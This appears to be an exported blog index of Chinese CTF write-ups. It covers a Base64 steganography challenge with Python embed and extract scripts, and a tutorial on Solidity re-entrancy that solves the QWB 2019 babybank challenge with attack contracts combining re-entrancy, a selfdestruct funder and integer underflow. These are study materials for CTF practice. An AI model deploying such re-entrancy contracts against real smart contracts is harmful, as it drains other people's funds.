两个等号情况隐写了4位二进制数，所以提取mbin2的后4bit</span><br>        <span class="hljs-comment"># 赋值给stegobin，这就是隐藏的二进制信息</span><br>        stegobin = mbin2[-<span class="hljs-number">4</span>:]<br>        binstring += stegobin<br>    <span class="hljs-keyword">elif</span> re.<span class="hljs-built_in">compile</span>(pattern1).findall(base64str):<br>        mstr = re.<span class="hljs-built_in">compile</span>(pattern1).findall(base64str)[<span class="hljs-number">0</span>]<br>        mbin = <span class="hljs-built_in">bin</span>(b64chars.find(mstr))<br>        mbin2 = mbin[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] + mbin[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>)<br>        <span class="hljs-comment"># 一个等号情况隐写了2位二进制数，所以提取mbin2的后2bit</span><br>        stegobin = mbin2[-<span class="hljs-number">2</span>:]<br>        binstring += stegobin<br>    base64str = f.readline()<br><br><span class="hljs-comment"># stegobin将各行隐藏的二进制字符拼接在一起</span><br><span class="hljs-comment"># 从第0位开始，8bit、8bit处理，所以range的步进为8</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(binstring),<span class="hljs-number">8</span>):<br>    <span class="hljs-comment"># int(xxx,2)，将二进制字符串转换为10进制的整数，再用chr()转为字符</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(binstring[i:i+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>)),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>加密脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> re<br><br>b64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;3.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    lines = f.readlines()  <span class="hljs-comment"># 读取所有行</span><br><br>flag = <span class="hljs-string">&#x27;c2tzZWN7QmFzZTY0aXNGNG59&#x27;</span><br>bin_str = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0b&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> flag])<br><br>add = <span class="hljs-number">0</span><br><br>pattern2 = <span class="hljs-string">r&#x27;(\S)==$&#x27;</span><br>pattern1 = <span class="hljs-string">r&#x27;(\S)=$&#x27;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;0.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> w:<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines: <br>        line = line.strip()<br>        <span class="hljs-keyword">if</span> add &gt;= <span class="hljs-built_in">len</span>(bin_str):  <span class="hljs-comment"># 检查是否已处理完flag</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> re.search(pattern2, line):<br>            tem = re.search(pattern2, line).group(<span class="hljs-number">1</span>)<br>            tembin = <span class="hljs-built_in">bin</span>(b64chars.find(tem))<br>            tembin2 = tembin[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] + tembin[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>)<br>            steg = tembin2[-<span class="hljs-number">4</span>:]<br>            tembin1 = tembin2[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>] + bin_str[add:add+<span class="hljs-number">4</span>]<br>            stag = b64chars[<span class="hljs-built_in">int</span>(tembin1, <span class="hljs-number">2</span>)]<br>            w.write(line[<span class="hljs-number">0</span>:-<span class="hljs-number">4</span>] + stag + <span class="hljs-string">&#x27;==\n&#x27;</span>)  <span class="hljs-comment"># 使用 write 而不是 writelines，并添加换行符</span><br>            add += <span class="hljs-number">4</span><br>        <span class="hljs-keyword">elif</span> re.search(pattern1, line):<br>            tem = re.search(pattern1, line).group(<span class="hljs-number">1</span>)<br>            tembin = <span class="hljs-built_in">bin</span>(b64chars.find(tem))<br>            tembin2 = tembin[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] + tembin[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">6</span>)<br>            steg = tembin2[-<span class="hljs-number">2</span>:]<br>            tembin1 = tembin2[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] + bin_str[add:add+<span class="hljs-number">2</span>]<br>            stag = b64chars[<span class="hljs-built_in">int</span>(tembin1, <span class="hljs-number">2</span>)]<br>            w.write(line[<span class="hljs-number">0</span>:-<span class="hljs-number">3</span>] + stag + <span class="hljs-string">&#x27;=\n&#x27;</span>)  <span class="hljs-comment"># 使用 write 而不是 writelines，并添加换行符</span><br>            add += <span class="hljs-number">2</span><br><br></code></pre></td></tr></table></figure><h4 id="NewstarCtf-2023"><a href="#NewstarCtf-2023" class="headerlink" title="NewstarCtf 2023"></a>NewstarCtf 2023</h4><h5 id="base"><a href="#base" class="headerlink" title="base!"></a>base!</h5><p>脚本解码得到</p><p>iDMb6ZMnTFMtFuouYZHwPTYAoWjC7Hjca8</p><p>即flag{b4se_1s_4_g0od_c0d3}</p><h4 id="base家族"><a href="#base家族" class="headerlink" title="base家族"></a>base家族</h4><p><a href="http://www.atoolbox.net/Tool.php?Id=934">http://www.atoolbox.net/Tool.php?Id=934</a></p><p><a href="https://ctf.bugku.com/tools">https://ctf.bugku.com/tools</a></p>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Re-Entrancy</title>
      <link href="/2023/10/19/Re-Entrancy/"/>
      <url>/2023/10/19/Re-Entrancy/</url>
      
        <content type="html"><![CDATA[<p>重入攻击是智能合约的经典攻击。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>fallback函数是一个特殊的结构，在特定情况下会被触发。</p><p>特点：</p><ol><li>不被命名</li><li>被外部调用，不能被自己合约的函数调用</li><li>一个合约至多只有一个fallback函数</li><li>会在别的合约调用一个本合约没有的函数调用</li><li>当eth被发送给这个合约是没有calldata同时没有receive函数，fallback是会被触发，要设置为payable</li><li>可以包含自己的逻辑</li></ol><p>下述行为消耗的gas都将超过fallback函数限定的gas值：</p><ul><li>向区块链中写数据</li><li>创建一个合约</li><li>调用一个external的函数</li><li>发送ether</li></ul><p>如果没有足够的Gas，是不足以支持不断重入的。<code>call.value()</code>转账给了我们足够的Gas。</p><p><code>&lt;address&gt;.transfer(uint256 amount)</code>:<br>向 地址类型 发送数量为 amount 的 Wei，失败时抛出 <strong>异常</strong>，发送 2300 gas 的矿工费，不可调节。</p><p><code>&lt;address&gt;.send(uint256 amount)</code>(bool):<br>向 地址类型 发送数量为 amount 的 Wei，失败时返回 <strong>false</strong>，发送 2300 gas 的矿工费用，不可调节。</p><p><code>&lt;address&gt;.call(...)</code> (bool):<br>发出低级函数 CALL，失败时返回 false，发送所有可用 gas，可调节。<br><code>.call</code>函数添加<code>.value</code>会附加上代币，形成转账</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Bank &#123;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    ...<br>    function withdraw(uint256 amount) public &#123;<br>        require(balanceOf[msg.sender] &gt;= amount);<br>        msg.sender.call.value(amount)();<br>        balanceOf[msg.sender] -= amount;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当balanceof充足时，就会调用转账功能。这个问题是，先转账再记账，若再次调用fallback（）函数，此时balanceof还未减少就会无限调用，可能导致gas不够用，因此需要限制次数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract hack&#123;<br>address instance;<br>Bank b=Bank(instance);<br>bool flag=0;<br>function attack()public&#123;<br>b.withdraw(1 ether);<br>&#125;<br>function () payable&#123;<br>if(!flag)&#123;<br>flag=1;<br>b.withdraw(1 ether);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="【强网杯2019】babybank"><a href="#【强网杯2019】babybank" class="headerlink" title="【强网杯2019】babybank"></a>【强网杯2019】babybank</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.23;<br><br>contract babybank &#123;<br>    mapping(address =&gt; uint) public balance;<br>    mapping(address =&gt; uint) public level;<br>    address owner;<br>    uint secret;<br>    <br>    //Don&#x27;t leak your teamtoken plaintext!!! md5(teamtoken).hexdigest() is enough.<br>    //Gmail is ok. 163 and qq may have some problems.<br>    event sendflag(string md5ofteamtoken,string b64email); <br>    <br>    <br>    constructor()public&#123;<br>        owner = msg.sender;<br>    &#125;<br>    <br>    //pay for flag<br>    function payforflag(string md5ofteamtoken,string b64email) public&#123;<br>        require(balance[msg.sender] &gt;= 10000000000);<br>        balance[msg.sender]=0;<br>        owner.transfer(address(this).balance);<br>        emit sendflag(md5ofteamtoken,b64email);<br>    &#125;<br>    <br>    modifier onlyOwner()&#123;<br>        require(msg.sender == owner);<br>        _;<br>    &#125;<br>    <br>    //challenge 1 <br>    function profit() public&#123;<br>        require(level[msg.sender]==0);<br>        require(uint(msg.sender) &amp; 0xffff==0xb1b1);<br>        balance[msg.sender]+=1;<br>        level[msg.sender]+=1;<br>    &#125;<br>    <br>    //challenge 2<br>    function set_secret(uint new_secret) public onlyOwner&#123;<br>        secret=new_secret;<br>    &#125;<br>    function guess(uint guess_secret) public&#123;<br>        require(guess_secret==secret);<br>        require(level[msg.sender]==1);<br>        balance[msg.sender]+=1;<br>        level[msg.sender]+=1;<br>    &#125;<br>    <br>    //challenge 3<br>    <br>    function transfer(address to, uint amount) public&#123;<br>        require(balance[msg.sender] &gt;= amount);<br>        require(amount==2);<br>        require(level[msg.sender]==2);<br>        balance[msg.sender] = 0;<br>        balance[to] = amount;<br>    &#125;<br>    <br>    function withdraw(uint amount) public&#123;<br>        require(amount==2);<br>        require(balance[msg.sender] &gt;= amount);<br>        msg.sender.call.value(amount*100000000000000)();<br>        balance[msg.sender] -= amount;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>pay for flag<br>    function payforflag(string md5ofteamtoken,string b64email) public{<br>        require(balance[msg.sender] &gt;&#x3D; 10000000000);<br>        balance[msg.sender]&#x3D;0;<br>        owner.transfer(address(this).balance);<br>        emit sendflag(md5ofteamtoken,b64email);<br>    }</p><p>当balance超过10000000000是就会触发flag函数。</p><p>发现withdraw函数发现重入漏洞 msg.sender.call.value(amount*100000000000000)();，可以配合整数下溢漏洞从而达到balance的要求。</p><p>要完成withdraw()函数需要完成三个挑战。</p><p>第一个是profit函数</p><p>require(level[msg.sender]&#x3D; &#x3D;0);<br>require(uint(msg.sender) &amp; 0xffff&#x3D;&#x3D;0xb1b1);</p><p>首先需要调用者level为0，其次需要调用者的后四位为b1b1，</p><p>level原本就是0，而后四位则可以通过网站生成固定账号，<a href="https://vanity-eth.tk/">Vanity-ETH | Ethereum vanity address generator</a></p><p>，即可绕过，此时balance以及level都为1，此时来到挑战2.</p><p>挑战2，需要猜到的与设置的guess相同。serect的值可以在合约的部署中找到。合约部署者的最后一次交易的inputdata桉树选择器前四个字节为函数的签名参数就是部署这传入的参数。</p><p>然后就可以调用withdraw函数。</p><p>但是由于合约没有任何blance因此需要先进行转账。</p><p>可以用selfdestruct函数来进行充值。</p><p>攻击合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract kill&#123;<br>function kill()payable&#123;<br>selfdestruct(address(0x.....));<br>&#125;<br>&#125;<br>interface BabybankInterface &#123;<br>    function withdraw(uint256 amount) external;<br>    function profit() external;<br>    function guess(uint256 number) external;<br>    function transfer(address to, uint256 amount) external;<br>    function payforflag(string md5ofteamtoken, string b64email) external;<br>&#125;<br>contract hack&#123;<br>address instance;<br>BankInterface b=BankInterface(instance);<br>uint flag=0;<br>function attack()public payable&#123;<br>b.profit();<br>b.guess(0x........);<br>b.withdraw(2);<br>b.payforflag(&#x27;123&#x27;,&#x27;123&#x27;);<br><br>&#125;<br>function()external payable&#123;<br>if(!flag)&#123;<br>flag=1;<br>b.withdraw(2);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>由于合约本身没有以太币，所以我们先生成合约A调用自杀函数给题目转钱。</li><li>进行转账操作，我们使用账户B分别调用profit()、guess()、transfer()给C账户转2token。</li><li>当C有了2token便可以进行攻击，调用hacker函数即可。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Attack </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
